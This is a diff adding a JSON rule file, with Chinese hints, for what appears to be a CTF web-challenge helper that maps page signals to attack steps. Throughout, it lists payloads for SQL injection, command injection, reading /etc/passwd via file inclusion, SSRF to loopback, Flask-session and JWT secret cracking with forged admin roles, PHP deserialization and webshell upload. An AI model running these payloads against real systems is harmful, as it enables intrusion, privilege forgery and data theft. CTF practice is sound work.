@@ -1,0 +1,159 @@
+{
+  "_comment": "看到 X → 想 Y。加规则只改这个文件；when 内各类条件是 AND，同类内多个正则是 OR。",
+  "rules": [
+    {
+      "id": "flask",
+      "name": "Flask / Werkzeug",
+      "when": {"header_re": ["Werkzeug", "flask", "Python/3"]},
+      "hint": "Flask 栈：先看 session cookie 是不是客户端签名（三段式），是就爆密钥改内容；模板渲染点试 SSTI。",
+      "cmds": [
+        "ctfctl req get \"$U/\" --head",
+        "ctfctl cookie flask-crack --cookie '<session 值>' -w /usr/share/wordlists/rockyou.txt",
+        "ctfctl cookie flask-sign --cookie '<session 值>' --secret <爆出的密钥> --set role=admin",
+        "curl -s \"$U/?name={{7*7}}\""
+      ]
+    },
+    {
+      "id": "php",
+      "name": "PHP 站",
+      "when": {"header_re": ["X-Powered-By: PHP", "\\.php"], "body_re": ["\\bphp\\b"]},
+      "hint": "PHP 栈：找判定条件 + 危险函数（eval/system/include）；顺手试伪协议与备份文件。",
+      "cmds": [
+        "curl -s \"$U/index.php.bak\" -o /dev/null -w '%{http_code} %{size_download}\\n'",
+        "curl -s \"$U/?file=php://filter/convert.base64-encode/resource=index.php\"",
+        "ctfctl recon \"$U\" --full"
+      ]
+    },
+    {
+      "id": "client_session",
+      "name": "客户端签名 session",
+      "when": {"header_re": ["set-cookie: [^=]*session=[A-Za-z0-9_\\-\\.]{20,}"]},
+      "hint": "session 值在客户端（三段 base64 或 zlib）。能拿到/爆出密钥就能改任意字段；注意 Flask 时间戳必须回拨（比服务端新会被整块丢弃→500）。",
+      "cmds": [
+        "ctfctl cookie list --base \"$U\"",
+        "ctfctl cookie flask-crack -w /usr/share/wordlists/rockyou.txt --base \"$U\""
+      ]
+    },
+    {
+      "id": "lfi_ssrf",
+      "name": "文件包含 / SSRF 入口",
+      "when": {"param_re": ["file", "path", "url", "src", "include", "page", "template", "load"]},
+      "hint": "参数名像路径/URL：试 file:// 读文件、回环地址打内网、伪协议读源码。",
+      "cmds": [
+        "curl -s \"$U/?file=file:///etc/passwd\"",
+        "curl -s \"$U/?url=http://127.0.0.1:80/\"",
+        "curl -s \"$U/?url=http://127.0.0.1:8080/\"",
+        "curl -s \"$U/?file=php://filter/convert.base64-encode/resource=index.php\""
+      ]
+    },
+    {
+      "id": "sqli",
+      "name": "SQL 注入候选",
+      "when": {"param_re": ["id", "search", "q", "uid", "user", "name", "cat", "page", "keyword", "order"]},
+      "hint": "参数像查询条件：手工三连（' → 1' → 1\"）看回显/长度变化，再上 union 或报错注入；sqlmap 只当兜底。",
+      "cmds": [
+        "curl -s \"$U/?id=1'\"",
+        "curl -s \"$U/?id=1'-- -\"",
+        "curl -s \"$U/?id=1 union select 1,2,3-- -\"",
+        "sqlmap -u \"$U/?id=1\" --batch --dbs"
+      ]
+    },
+    {
+      "id": "rce",
+      "name": "命令执行候选",
+      "when": {"param_re": ["cmd", "exec", "system", "do", "run", "shell", "code", "eval", "type"]},
+      "hint": "参数像执行点：先 echo 1 确认执行，再试 ;id |id &&id $(id)；被过滤就换分隔符/编码。",
+      "cmds": [
+        "curl -s \"$U/?cmd=echo%201\"",
+        "curl -s \"$U/?cmd=;id\"",
+        "curl -s \"$U/?cmd=%24(id)\"",
+        "curl -s \"$U/?cmd=cat%20/flag*\""
+      ]
+    },
+    {
+      "id": "authz",
+      "name": "认证 / 权限伪造",
+      "when": {"body_re": ["不是管理员", "只有管理员", "admin only", "权限不足", "forbidden", "you are not"]},
+      "hint": "只差身份：改 Cookie/JWT/session，或试弱口令；JWT 先看密钥是否泄露、算法能否换 none/HS256 混用。",
+      "cmds": [
+        "ctfctl cookie list --base \"$U\"",
+        "ctfctl req get \"$U/\" -b 'role=admin' -b 'is_admin=1'",
+        "ctfctl jwt decode \"$TOKEN\"",
+        "ctfctl jwt sign \"$TOKEN\" --secret <泄露的密钥> --set role=admin"
+      ]
+    },
+    {
+      "id": "unserialize",
+      "name": "PHP 反序列化",
+      "when": {"body_re": ["unserialize", "__wakeup", "__destruct", "O:\\d+:\\\""]},
+      "hint": "出现反序列化/魔术方法：找可控入口 → 构造 serialize() payload 触发 __wakeup/__destruct。",
+      "cmds": ["python3 -c \"print('O:4:\\\"User\\\":1:{s:4:\\\"role\\\";s:5:\\\"admin\\\";}')\""]
+    },
+    {
+      "id": "blind",
+      "name": "无回显 / 盲注",
+      "when": {"body_re": ["无回显", "no output", "same response"]},
+      "hint": "响应永远一样但行为变了：外带（DNS/HTTP）、延时、写文件三种验证。",
+      "cmds": ["curl -s \"$U/?cmd=sleep%205\" -w '%{time_total}\\n' -o /dev/null"]
+    },
+    {
+      "id": "fake200",
+      "name": "假 200（nginx try_files 回退）",
+      "when": {"file_re": ["FAKE"]},
+      "hint": "状态码 200 不算数：字节数与 Content-Type 和首页一致=假；.php 结尾会走 PHP 层给真 404。",
+      "cmds": ["ctfctl recon \"$U\" --full     # recon 已自动标注 FAKE/REAL"]
+    },
+    {
+      "id": "source_leak",
+      "name": "源码 / 备份泄露",
+      "when": {"file_re": ["REAL"]},
+      "hint": "扫到真实存在的备份/源码：下载解包，读判定条件与危险函数。",
+      "cmds": [
+        "curl -s -o src.zip \"$U/<扫到的文件>\" && unzip -o src.zip -d src/",
+        "grep -rnE \"eval|system|include|preg_replace|==|md5\\(\" src/ | head -50"
+      ]
+    },
+    {
+      "id": "git_leak",
+      "name": "Git 泄露",
+      "when": {"file_re": ["\\.git/HEAD", "\\.git/config"]},
+      "hint": ".git 可读：整仓 down（git-dumper 或手撸 objects），看历史与悬空对象。",
+      "cmds": [
+        "git-dumper \"$U/.git/\" ./gitdump",
+        "cd gitdump && git log --all --oneline && git stash list && git fsck --lost-found"
+      ]
+    },
+    {
+      "id": "vim_swp",
+      "name": "vim 交换文件",
+      "when": {"file_re": ["\\.swp"]},
+      "hint": "拿到 .swp：vim -r 恢复，里面常有源码全文。",
+      "cmds": ["vim -r .index.php.swp     # 然后 :wq 导出"]
+    },
+    {
+      "id": "jwt_token",
+      "name": "JWT 令牌",
+      "when": {"body_re": ["eyJ[A-Za-z0-9_\\-]{5,}\\.[A-Za-z0-9_\\-]{5,}\\."]},
+      "hint": "页面里有 JWT：解 payload 看角色/有效期；密钥泄露→重签；算法混用/none→绕过。",
+      "cmds": [
+        "ctfctl jwt decode \"$TOKEN\"",
+        "ctfctl jwt crack \"$TOKEN\" -w /usr/share/wordlists/rockyou.txt",
+        "ctfctl jwt sign \"$TOKEN\" --secret <密钥> --set role=admin"
+      ]
+    },
+    {
+      "id": "egress_403",
+      "name": "403/空响应 = 出口问题",
+      "when": {"body_re": []},
+      "hint": "403 或空响应先怀疑自己的网络出口（容器/校园网/代理），不是题目：换网络、加 --proxy、或改用浏览器 fetch。",
+      "cmds": ["ctfctl req get \"$U/\" --proxy 本地回环地址:8080 -v"]
+    },
+    {
+      "id": "upload",
+      "name": "上传点",
+      "when": {"body_re": ["<input[^>]+type=[\"']?file", "upload", "选择文件"]},
+      "hint": "有上传：先试探后缀黑名单（.phtml/.php5/.htaccess/大小写/双写/尾点空格），再看能否穿越目录。",
+      "cmds": ["curl -s -F 'file=@shell.phtml;filename=shell.phtml' \"$U/upload\""]
+    }
+  ]
+}
